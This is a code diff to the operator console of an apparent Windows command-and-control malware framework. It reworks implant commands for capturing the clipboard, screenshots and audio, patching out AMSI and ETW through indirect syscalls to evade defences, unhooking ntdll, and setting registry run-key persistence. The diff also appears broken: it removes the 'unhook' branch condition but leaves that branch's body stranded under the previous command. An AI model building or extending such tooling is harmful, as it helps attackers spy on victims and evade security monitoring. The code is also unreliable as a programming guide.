@@ -83,9 +83,10 @@ agent_completer_windows = NestedCompleter.from_nested_dict({
     'clipboard': None,
     'screenshot': None,
     'audio': None,
-    'unhook': None,
-    'amsi': None,
-    'etw': None,
+    'patch': {
+        'amsi': None,
+        'etw': None
+    },
     'persist': {
         'run': None,
         'spe': None
@@ -199,9 +200,7 @@ def print_agent_help(os):
                                                warning: make sure the assembly doesn't call any exit function
     
     --== Evasion Stuff ==--
-    unhook                                 ->  unhook ntdll.dll
-    amsi                                   ->  patch amsi out of the current process
-    etw                                    ->  patch etw out of the current process
+    patch <amsi|etw>                       ->  patch amsi/etw using indirect syscalls
     
     --== Persistence Stuff ==--
     persist run <command> <key-name>       ->  set run key (will try first hklm, then hkcu)
@@ -403,19 +402,15 @@ def agent_screen_windows(agent_id):
                     "assembly_args": assembly_args
                 }
 
-            elif re.fullmatch(r"\s*unhook\s*", command):
                 command_dict = {
                     "command_type": "unhook"
                 }
 
-            elif re.fullmatch(r"\s*amsi\s*", command):
+            elif re.fullmatch(r"\s*patch\s+(etw|amsi)\s*", command):
+                patch_func = shlex.split(re.sub(r"\s*patch\s+", "", command, 1))[0]
                 command_dict = {
-                    "command_type": "amsi"
-                }
-
-            elif re.fullmatch(r"\s*etw\s*", command):
-                command_dict = {
-                    "command_type": "etw"
+                    "command_type": "patch",
+                    "patch_func": patch_func
                 }
 
             elif re.fullmatch(r"\s*persist\s+(run|spe)\s+.*", command):
